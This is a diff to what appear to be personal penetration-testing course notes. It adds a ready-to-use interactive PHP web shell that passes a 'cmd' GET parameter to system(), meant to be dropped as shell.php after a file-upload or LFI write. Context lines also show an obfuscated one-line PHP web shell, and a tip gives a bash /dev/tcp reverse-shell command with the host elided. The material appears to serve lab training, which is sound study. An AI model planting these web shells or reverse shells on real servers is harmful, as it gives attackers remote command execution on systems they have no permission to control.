@@ -39,6 +39,20 @@ echo "<pre>" . htmlspecialchars($output) . "</pre>";
 <?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['c']); ?>
 ```
 
+**Interactive browser form** — a small step up from a one-liner: gives you an input box + rendered output in the browser, so you don't hand-URL-encode every command. Drop it as `shell.php` after an upload/LFI-to-write:
+
+```php
+<html><body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+  <input type="text" name="cmd" autofocus id="cmd" size="80">
+  <input type="submit" value="Run">
+</form>
+<pre><?php if (isset($_GET['cmd'])) { system($_GET['cmd'] . ' 2>&1'); } ?></pre>
+</body></html>
+```
+
+> [!tip] `2>&1` folds stderr into the page so failed commands aren't silently blank. Prefer this form as a quick manual foothold, then pivot to a real shell (`bash -c 'bash -i >& /dev/tcp/…'`) — see [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].
+
 ---
 
 ## Reverse Shell (PHP)
